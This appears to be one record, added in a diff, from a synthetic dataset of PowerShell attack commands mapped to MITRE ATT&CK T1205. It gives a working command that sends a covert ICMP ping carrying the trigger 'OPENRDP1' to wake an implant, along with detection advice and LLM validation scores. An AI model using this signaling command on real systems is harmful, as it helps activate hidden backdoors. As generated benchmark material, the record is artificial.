@@ -1,0 +1,37 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $target='10.0.0.50'; $payload=[Convert]::FromBase64String('T1BFTlJEUDE='); $ping=New-Object System.Net.NetworkInformation.Ping; $opts=New-Object System.Net.NetworkInformation.PingOptions(64,$false); [void]$ping.Send($target,1000,$payload,$opts) }",
+  "explanation": "Transmits a covert ICMP echo request with magic payload 'OPENRDP1' (base64-encoded). A listening implant could treat this as a signal to enable RDP or a hidden listener. Detection: inspect ICMP payload entropy/strings and frequency; IDS signatures for specific magic strings; baseline hosts rarely sending data-laden pings internally. No elevation required; UAC not triggered.",
+  "rationale_steps": [
+    "Embed a recognizable trigger string in ICMP payload.",
+    "Send ping to signal a remote agent to enable a feature (e.g., open RDP).",
+    "Recommend ICMP payload content monitoring for detection."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-1108f921-4a92442d",
+  "source_prompt_hash": "1108f921",
+  "timestamp_utc": "2025-09-30T05:58:00.779201Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid PowerShell with balanced quotes/braces, correct ScriptBlock usage, and proper New-Object constructions and Ping.Send arguments.",
+        "semantic_score": 5,
+        "semantic_justification": "It base64-decodes 'OPENRDP1' to bytes and sends them as the ICMP echo payload to 10.0.0.50 via System.Net.NetworkInformation.Ping, aligning with T1205 traffic signaling and not requiring elevation.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T19:15:03.796840Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
